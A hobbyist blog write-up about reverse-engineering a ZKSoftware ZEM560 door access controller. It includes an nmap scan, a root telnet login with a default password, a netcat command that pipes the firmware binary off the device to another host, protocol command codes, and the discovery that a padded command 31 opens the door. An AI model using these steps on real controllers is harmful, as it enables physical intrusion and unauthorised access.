<!DOCTYPE html>
<html>
<style>

		@font-face { font-family: "gohu"; src: url("/gohu.woff") format('woff'); }
		body {
			font-family: 'gohu', monospace;
			max-width: 50em;
			margin: 0 auto;
			color: white;
			background: black;
			line-height: calc(1ex / 0.32);
		}
		pre {
			font-family: 'gohu', monospace;
			white-space: pre-wrap;
			line-height: 125%;
      background-color: #111;
      padding: 1em;
		}
		@media only screen and (max-width:768px) {
			body {
				max-width:100%;
			}
		}
		a:link {
			color: #0a0 ;
		}
		a:visited {
			color: #004100 ;
		}
		td.linenos .normal { color: inherit; background-color: transparent; padding-left: 5px; padding-right: 5px; }
		span.linenos { color: inherit; background-color: transparent; padding-left: 5px; padding-right: 5px; }
		td.linenos .special { color: #000000; background-color: #ffffc0; padding-left: 5px; padding-right: 5px; }
		span.linenos.special { color: #000000; background-color: #ffffc0; padding-left: 5px; padding-right: 5px; }
		.codehilite .hll { background-color: #0000ff }
		.codehilite { background: #000000; }
		.codehilite .c { color: #00ff00 } /* Comment */
		.codehilite .k { color: #ff0000 } /* Keyword */
		.codehilite .ch { color: #00ff00 } /* Comment.Hashbang */
		.codehilite .cm { color: #00ff00 } /* Comment.Multiline */
		.codehilite .cp { color: #e5e5e5 } /* Comment.Preproc */
		.codehilite .cpf { color: #00ff00 } /* Comment.PreprocFile */
		.codehilite .c1 { color: #00ff00 } /* Comment.Single */
		.codehilite .cs { color: #00ff00 } /* Comment.Special */
		.codehilite .kc { color: #ff0000 } /* Keyword.Constant */
		.codehilite .kd { color: #ff0000 } /* Keyword.Declaration */
		.codehilite .kn { color: #ff0000 } /* Keyword.Namespace */
		.codehilite .kp { color: #ff0000 } /* Keyword.Pseudo */
		.codehilite .kr { color: #ff0000 } /* Keyword.Reserved */
		.codehilite .kt { color: #ee82ee } /* Keyword.Type */
		.codehilite .s { color: #87ceeb } /* Literal.String */
		.codehilite .no { color: #7fffd4 } /* Name.Constant */
		.codehilite .nf { color: #ffff00 } /* Name.Function */
		.codehilite .nv { color: #eedd82 } /* Name.Variable */
		.codehilite .sa { color: #87ceeb } /* Literal.String.Affix */
		.codehilite .sb { color: #87ceeb } /* Literal.String.Backtick */
		.codehilite .sc { color: #87ceeb } /* Literal.String.Char */
		.codehilite .dl { color: #87ceeb } /* Literal.String.Delimiter */
		.codehilite .sd { color: #87ceeb } /* Literal.String.Doc */
		.codehilite .s2 { color: #87ceeb } /* Literal.String.Double */
		.codehilite .se { color: #87ceeb } /* Literal.String.Escape */
		.codehilite .sh { color: #87ceeb } /* Literal.String.Heredoc */
		.codehilite .si { color: #87ceeb } /* Literal.String.Interpol */
		.codehilite .sx { color: #87ceeb } /* Literal.String.Other */
		.codehilite .sr { color: #87ceeb } /* Literal.String.Regex */
		.codehilite .s1 { color: #87ceeb } /* Literal.String.Single */
		.codehilite .ss { color: #87ceeb } /* Literal.String.Symbol */
		.codehilite .fm { color: #ffff00 } /* Name.Function.Magic */
		.codehilite .vc { color: #eedd82 } /* Name.Variable.Class */
		.codehilite .vg { color: #eedd82 } /* Name.Variable.Global */
		.codehilite .vi { color: #eedd82 } /* Name.Variable.Instance */
		.codehilite .vm { color: #eedd82 } /* Name.Variable.Magic */
	
</style>
<head>
  <meta charset="UTF-8">
</head>

<body><h1>Opening doors</h1>
<p>1468195200</p>
<p><em>Or trying to reverse engineering a access control</em></p>
<p>Everything started with me trying to get my RaspBerry PI to unlock a door . The door I’m supposed to open has a access control , like that one :</p>
<p><img alt="" src="img/0__4EY4LBSsXPscOzOX.png" /></p>
<p>So … that’s a shit/toy-ish/R$2k/access control and it fucking opens doors . How to get my rasp to control it ? <em>No , I can’t just open it and read the UART or something — it costs 2k</em>. I’m going to try to get remote control , NMAP TIME !</p>
<div class="codehilite"><pre><span></span><code>            $ nmap -sV 10.0.3.-
</code></pre></div>


<p>Yeah , I use fish , I like autocomplete , I don’t memorize commands , judge me. If you don’t get it , if it was bash it would be a <code>*</code> instead of a <code>-</code> w/e .</p>
<div class="codehilite"><pre><span></span><code>            <span class="nt">Starting</span> <span class="nt">Nmap</span> <span class="nt">7</span><span class="p">.</span><span class="nc">12</span> <span class="o">(</span> <span class="nt">https</span><span class="o">://</span><span class="nt">nmap</span><span class="p">.</span><span class="nc">org</span> <span class="o">)</span> <span class="nt">at</span> <span class="nt">2016-07-10</span> <span class="nt">23</span><span class="p">:</span><span class="nd">15</span> <span class="nt">BRT</span>
            <span class="nt">Nmap</span> <span class="nt">scan</span> <span class="nt">report</span> <span class="nt">for</span> <span class="nt">10</span><span class="p">.</span><span class="nc">0</span><span class="p">.</span><span class="nc">3</span><span class="p">.</span><span class="nc">117</span>
            <span class="nt">Host</span> <span class="nt">is</span> <span class="nt">up</span> <span class="o">(</span><span class="nt">0</span><span class="p">.</span><span class="nc">094s</span> <span class="nt">latency</span><span class="o">).</span>
            <span class="nt">Not</span> <span class="nt">shown</span><span class="o">:</span> <span class="nt">994</span> <span class="nt">closed</span> <span class="nt">ports</span>
            <span class="nt">PORT</span> <span class="nt">STATE</span> <span class="nt">SERVICE</span> <span class="nt">VERSION</span>
            <span class="nt">23</span><span class="o">/</span><span class="nt">tcp</span> <span class="nt">open</span> <span class="nt">telnet</span> <span class="nt">ZKSoftware</span> <span class="nt">ZEM560</span> <span class="nt">access</span> <span class="nt">control</span> <span class="nt">device</span> <span class="o">(</span><span class="nt">Linux</span> <span class="nt">2</span><span class="p">.</span><span class="nc">6</span><span class="p">.</span><span class="nc">24</span><span class="o">;</span> <span class="nt">MIPS</span><span class="o">)</span>
</code></pre></div>


<p>Or something like that , there is a port missing <br />
Open 23 ! And what the fuck is ZEM560 ? Googling aroung I’ve found that shit has already been pwned : <a href="http://blog.zerial.org/seguridad/vulnerar-la-seguridad-fisica-de-un-control-de-acceso-biometrico/">blog.zerial.org/seguridad/vulnerar-la-seguridad-fisica-de-un-control-de-acceso-biometrico</a> &amp;&amp; <a href="http://blog.infobytesec.com/2014/07/perverting-embedded-devices-zksoftware_2920.html">blog.infobytesec.com/2014/07/perverting-embedded-devices-zksoftware_2920.html</a> . Unfortunately they are all about the web panel , which is turned off in my case . But it have a series of default login/password for the telnet and one of them worked . I was going to brute force it , but it worked on the second try , wut .</p>
<div class="codehilite"><pre><span></span><code>            $ <span class="nv">telnet</span> <span class="mi">10</span>.<span class="mi">0</span>.<span class="mi">3</span>.<span class="mi">117</span><span class="nv">Trying</span> <span class="mi">10</span>.<span class="mi">0</span>.<span class="mi">3</span>.<span class="mi">117</span>…<span class="nv">Connected</span> <span class="nv">to</span> <span class="nv">xxxxxxxxxxxxxxxEscape</span> <span class="nv">character</span> <span class="nv">is</span> <span class="s1">&#39;</span><span class="s">^]</span><span class="s1">&#39;</span>.

            <span class="nv">Welcome</span> <span class="nv">to</span> <span class="nv">Linux</span> <span class="ss">(</span><span class="nv">ZEM560</span><span class="ss">)</span> <span class="k">for</span> <span class="nv">MIPSKernel</span> <span class="mi">2</span>.<span class="mi">6</span>.<span class="mi">24</span> <span class="nv">Treckle</span> <span class="nv">on</span> <span class="nv">an</span> <span class="nv">MIPSZEM560</span> <span class="nv">login</span>: <span class="nv">rootPassword</span>:# <span class="nv">iduid</span><span class="o">=</span><span class="mi">0</span><span class="ss">(</span><span class="nv">root</span><span class="ss">)</span> <span class="nv">gid</span><span class="o">=</span><span class="mi">0</span><span class="ss">(</span><span class="nv">root</span><span class="ss">)</span> <span class="nv">groups</span><span class="o">=</span><span class="mi">0</span><span class="ss">(</span><span class="nv">root</span><span class="ss">)</span>
</code></pre></div>


<p>YEESSSS , root , lol , that was easy. Soooo , what the fucking is running and how to open the FUCKING door ?</p>
<div class="codehilite"><pre><span></span><code><span class="w">            </span><span class="err">#</span><span class="w"> </span><span class="n">ps</span><span class="w">  </span><span class="n">PID</span><span class="w"> </span><span class="k">USER</span><span class="w">       </span><span class="n">VSZ</span><span class="w"> </span><span class="n">STAT</span><span class="w"> </span><span class="n">COMMAND</span><span class="w">    </span><span class="mi">1</span><span class="w"> </span><span class="n">root</span><span class="w">      </span><span class="mi">3788</span><span class="w"> </span><span class="n">S</span><span class="w">    </span><span class="n">init</span><span class="w">    </span><span class="mi">2</span><span class="w"> </span><span class="n">root</span><span class="w">         </span><span class="mi">0</span><span class="w"> </span><span class="n">SW</span><span class="o">&lt;</span><span class="w">  </span><span class="o">[</span><span class="n">kthreadd</span><span class="o">]</span><span class="w">    </span><span class="mi">3</span><span class="w"> </span><span class="n">root</span><span class="w">         </span><span class="mi">0</span><span class="w"> </span><span class="n">SW</span><span class="o">&lt;</span><span class="w">  </span><span class="o">[</span><span class="n">ksoftirqd/0</span><span class="o">]</span><span class="w">    </span><span class="mi">4</span><span class="w"> </span><span class="n">root</span><span class="w">         </span><span class="mi">0</span><span class="w"> </span><span class="n">SW</span><span class="o">&lt;</span><span class="w">  </span><span class="o">[</span><span class="n">events/0</span><span class="o">]</span><span class="w">    </span><span class="mi">5</span><span class="w"> </span><span class="n">root</span><span class="w">         </span><span class="mi">0</span><span class="w"> </span><span class="n">SW</span><span class="o">&lt;</span><span class="w">  </span><span class="o">[</span><span class="n">khelper</span><span class="o">]</span><span class="w">   </span><span class="mi">40</span><span class="w"> </span><span class="n">root</span><span class="w">         </span><span class="mi">0</span><span class="w"> </span><span class="n">SW</span><span class="o">&lt;</span><span class="w">  </span><span class="o">[</span><span class="n">kblockd/0</span><span class="o">]</span><span class="w">   </span><span class="mi">48</span><span class="w"> </span><span class="n">root</span><span class="w">         </span><span class="mi">0</span><span class="w"> </span><span class="n">SW</span><span class="o">&lt;</span><span class="w">  </span><span class="o">[</span><span class="n">ksuspend_usbd</span><span class="o">]</span><span class="w">   </span><span class="mi">54</span><span class="w"> </span><span class="n">root</span><span class="w">         </span><span class="mi">0</span><span class="w"> </span><span class="n">SW</span><span class="o">&lt;</span><span class="w">  </span><span class="o">[</span><span class="n">khubd</span><span class="o">]</span><span class="w">   </span><span class="mi">57</span><span class="w"> </span><span class="n">root</span><span class="w">         </span><span class="mi">0</span><span class="w"> </span><span class="n">SW</span><span class="o">&lt;</span><span class="w">  </span><span class="o">[</span><span class="n">kseriod</span><span class="o">]</span><span class="w">   </span><span class="mi">75</span><span class="w"> </span><span class="n">root</span><span class="w">         </span><span class="mi">0</span><span class="w"> </span><span class="n">SW</span><span class="w">   </span><span class="o">[</span><span class="n">pdflush</span><span class="o">]</span><span class="w">   </span><span class="mi">76</span><span class="w"> </span><span class="n">root</span><span class="w">         </span><span class="mi">0</span><span class="w"> </span><span class="n">SW</span><span class="w">   </span><span class="o">[</span><span class="n">pdflush</span><span class="o">]</span><span class="w">   </span><span class="mi">77</span><span class="w"> </span><span class="n">root</span><span class="w">         </span><span class="mi">0</span><span class="w"> </span><span class="n">SW</span><span class="o">&lt;</span><span class="w">  </span><span class="o">[</span><span class="n">kswapd0</span><span class="o">]</span><span class="w">   </span><span class="mi">78</span><span class="w"> </span><span class="n">root</span><span class="w">         </span><span class="mi">0</span><span class="w"> </span><span class="n">SW</span><span class="o">&lt;</span><span class="w">  </span><span class="o">[</span><span class="n">aio/0</span><span class="o">]</span><span class="w">  </span><span class="mi">624</span><span class="w"> </span><span class="n">root</span><span class="w">         </span><span class="mi">0</span><span class="w"> </span><span class="n">SW</span><span class="o">&lt;</span><span class="w">  </span><span class="o">[</span><span class="n">mtdblockd</span><span class="o">]</span><span class="w">  </span><span class="mi">657</span><span class="w"> </span><span class="n">root</span><span class="w">      </span><span class="mi">3788</span><span class="w"> </span><span class="n">S</span><span class="w">    </span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">sh</span><span class="w"> </span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">init</span><span class="p">.</span><span class="n">d</span><span class="o">/</span><span class="n">rcS</span><span class="w">  </span><span class="mi">663</span><span class="w"> </span><span class="n">root</span><span class="w">         </span><span class="mi">0</span><span class="w"> </span><span class="n">SW</span><span class="w">   </span><span class="o">[</span><span class="n">eth0</span><span class="o">]</span><span class="w">  </span><span class="mi">665</span><span class="w"> </span><span class="n">root</span><span class="w">      </span><span class="mi">3852</span><span class="w"> </span><span class="n">S</span><span class="w">    </span><span class="n">telnetd</span><span class="w"> </span><span class="o">-</span><span class="n">l</span><span class="w"> </span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">login</span><span class="w">  </span><span class="mi">700</span><span class="w"> </span><span class="n">root</span><span class="w">      </span><span class="mi">9396</span><span class="w"> </span><span class="n">S</span><span class="w">    </span><span class="o">/</span><span class="n">mnt</span><span class="o">/</span><span class="n">mtdblock</span><span class="o">/</span><span class="n">inbiocomm</span><span class="w">  </span><span class="mi">703</span><span class="w"> </span><span class="n">root</span><span class="w">     </span><span class="mi">18516</span><span class="w"> </span><span class="n">S</span><span class="w">    </span><span class="o">/</span><span class="n">mnt</span><span class="o">/</span><span class="n">mtdblock</span><span class="o">/</span><span class="n">main</span><span class="w"> </span><span class="mi">5570</span><span class="w"> </span><span class="n">root</span><span class="w">      </span><span class="mi">3852</span><span class="w"> </span><span class="n">S</span><span class="w">    </span><span class="o">-</span><span class="n">sh</span><span class="w"> </span><span class="mi">5573</span><span class="w"> </span><span class="n">root</span><span class="w">      </span><span class="mi">3920</span><span class="w"> </span><span class="n">S</span><span class="w">    </span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">login</span><span class="w"> </span><span class="mi">5574</span><span class="w"> </span><span class="n">root</span><span class="w">      </span><span class="mi">3852</span><span class="w"> </span><span class="n">R</span><span class="w">    </span><span class="n">ps</span><span class="w"></span>
</code></pre></div>


<p>“rcS” and “main” looks interesting , I’m gonna check it out .</p>
<div class="codehilite"><pre><span></span><code>            # cd /mnt/mtdblock/# lsLANGUAGE.E                 firmware_20160615.log_bak  LANGUAGE.S                 firmware_20160616.log_bak  auto.sh                    firmware_20160619.log_bak  custattstate.dat           firmware_20160620.log_bak  custvoice.dat              firmware_20160623.log_bak  data                       firmware_20160625.log_bak  drivers                    firmware_20160702.log_bak  dump.txt                   firmware_20160703.log_bak  eerom.txt                  firmware_20160707.log_bak  extlog.dat                 firmware_20160710.log  extuser.dat                font  firmware_20160411.log_bak  getf  firmware_20160413.log_bak  iengine.lic  firmware_20160416.log_bak  inbiocomm  firmware_20160420.log_bak  lconfig.bin  firmware_20160422.log_bak  lib  firmware_20160423.log_bak  lost+found  firmware_20160426.log_bak  main  firmware_20160503.log_bak  nprog.log  firmware_20160507.log_bak  number.log  firmware_20160511.log_bak  oplog.dat  firmware_20160520.log_bak  options.cfg  firmware_20160521.log_bak  sms.dat  firmware_20160523.log_bak  templatev10.dat  firmware_20160524.log_bak  test.sh  firmware_20160525.log_bak  transaction.dat  firmware_20160527.log_bak  udata.dat  firmware_20160607.log_bak  usbpower.zem500  firmware_20160609.log_bak  user.dat  firmware_20160610.log_bak  wav  firmware_20160613.log_bak  workcode.dat  firmware_20160614.log_bak
</code></pre></div>


<p>SOOOOOO MUUUUUCH THINGS TO LOOK ! ( and so many .log_bak , clean your shit )</p>
<div class="codehilite"><pre><span></span><code>            # cat options.cfg
            TCPPort=4368  ~ShowSecond=0~PrinterFunOn=0ConnectMODEM=0  ~MaxUserFingerCount=10~OutSensorFunOn=0~ProductTime=~SerialNumber=AdmRetry=3  DtFmt=0  NetSpeed=0  HiSpeedNet=8  IPAddress=192.168.1.201  NetMask=255.255.255.0  ~MIFAREID=0~iCLASS=0~iCLASSID=0~iCLASSTYPE=0~RFFPC=1FPRetry=3  PwdRetry=3  HavePowerKey=1  LockPowerKey=0  ~ASFO=1AlwaysShowState=0  ~ShowState=1…etc  etc
</code></pre></div>


<p>And it goes on , and on How the fuck I get the “main” binary out of there ?</p>
<p>On my pc :</p>
<div class="codehilite"><pre><span></span><code>            $ nc -l -p 666 &gt; main
</code></pre></div>


<p>On the very-fucking-expensive-shit :</p>
<div class="codehilite"><pre><span></span><code>            # cat main | nc 192.168.0.42 666 #No idea what my IP was
</code></pre></div>


<p>And I know that’s a shitty way to transfer files , but it worked , yay. IDA time ? Maybe , but I’m a newbie in Reverse can’t even do the easy ones in the CTFs :’( What I was thinking ? Anyway , gonna leave this alone . The binary are here , if someone want to take a look : <a href="https://usercontent.irccloud-cdn.com/file/2zmjRRUE/main">main</a></p>
<p>A week after …</p>
<p>I’ve found the piece of software that controls it : <a href="http://www.automatiza.com/wp-content/uploads/2015/07/setup_soapAdminCA_V2_1_5.7z">setup_soapAdminCA_V2_1_5.7z</a></p>
<p><img alt="" src="img/0__cB__xeUzgAz7yFMil.png" /></p>
<p>And it has a button called “Liberar Acesso” , Read it “open the fucking door”</p>
<p><img alt="" src="img/0__n__CJmYpjK0WOzhJ1.png" /></p>
<p>You just put the IP and the custom port , which by default is 4370 — that was the port I was talking about — and voilà ! It opens the door , any door!</p>
<p>What is easier ? Sniff the network or reverse the software ? Wireshark , always.</p>
<p><img alt="" src="img/0__4TaA2nnHnwwHyShU.png" /></p>
<p>Some TCP , a lot of UDP going on . The connections starts with a</p>
<p><img alt="" src="img/0__bezr0c3Z1n5gNYXq.png" /></p>
<p>And ends with</p>
<p><img alt="Highlighted part is the data" src="img/0__dWX__erP__9rkBzEcw.png" />
Highlighted part is the data</p>
<p>Looking around the .pcap it looks like there is two kinds of commands , first one just send a number and has 8 bytes of data :</p>
<p><img alt="" src="img/0__H8dSW3OrR__orknXK.png" /></p>
<p>and the other sends a <code>0B 00</code> plus a string:</p>
<p><img alt="" src="img/0__LRwd83wUZevcAe5Y.png" /></p>
<p>Googling around again — I should do this more often — I found this piece of gold <a href="https://github.com/dnaextrim/python_zklib">github.com/dnaextrim/python_zklib</a> . Fucking BIG thank you dnaextrim ! Random dude that reverse that insane custom protocol !</p>
<p>The zkconst.py has a lot of revealed commands :</p>
<div class="codehilite"><pre><span></span><code>            CMD_CONNECT = 1000  CMD_EXIT = 1001  CMD_ENABLEDEVICE = 1002  CMD_DISABLEDEVICE = 1003  CMD_RESTART = 1004  CMD_POWEROFF = 1005CMD_ACK_OK = 2000  CMD_ACK_ERROR = 2001  CMD_ACK_DATA = 2002CMD_PREPARE_DATA = 1500  CMD_DATA = 1501CMD_USERTEMP_RRQ = 9  CMD_ATTLOG_RRQ = 13  CMD_CLEAR_DATA = 14  CMD_CLEAR_ATTLOG = 15CMD_WRITE_LCD = 66CMD_GET_TIME  = 201  CMD_SET_TIME  = 202CMD_VERSION = 1100  CMD_DEVICE = 11CMD_CLEAR_ADMIN = 20  CMD_SET_USER = 8  CMD_PREPARE_DATA = 1500  CMD_REFRESHOPTION = 1014  CMD_FREE_DATA = 1502  CMD_RESTART = 1004  CMD_REFRESHDATA = 1013LEVEL_USER = 0  LEVEL_ADMIN = 14
</code></pre></div>


<p>That first UDP packet sends <code>E8 03</code> as the first byte , which is 59395 in decimal , but <code>03 E8</code> (<a href="https://www.cs.umd.edu/class/sum2003/cmsc311/Notes/Data/endian.html">cs.umd.edu/class/sum2003/cmsc311/Notes/Data/endian.html</a>) is 1000 in decimal ! WHICH IS THE FUCKING <code>CMD_CONNECT</code> COMMAND ! Yeah , I got hyped , three days to figure this out</p>
<p>But nothing of “open the door” :’( So I’ve edited one of the zklib’s function to send custom commands :</p>
<p>And tried to send every one of the commands on the pcap to open the door and none worked :’( Even tried to send’em in the same order — I play a lot of CTFs , overthinking is my morning coffe .</p>
<p>There was two commands of the first type that it hasn’t been reversed , <code>69</code> and <code>31</code> . Send them in my custom function didn’t work :’( After a lot of redbulls and dreaming about the packets , I’ve realized that the <code>31</code> command always have <code>00 00</code> attached to the final , which is odd . So I tried to attach a bunch of “A” in the end of the packet and IT WORKED ! THE DOOR OPENED ! FUCK YEAH ! weird as fuck , but yeah , done ! Just copy the script to the raspberry and it’s done .</p>
<p>YAAAAAAAAAAAAAAAY ! FIREWORKS !!!</p>
<p>Post Mortem :<br />
1. My first tough was to figure out what to write in some /dev/ , if someones knows how, please comment<br />
2. Probablly that protocol is not so custom and I’m just dumb<br />
3. <code>66</code> is the command to make that thing play a sound<br />
4. You can edit a lot of this with root , A LOT<br />
5- I’m n00b , sorry if I get something wrong</p></body><hr>by <a href='https://twitter.com/caioluders'>@caioluders</a></html>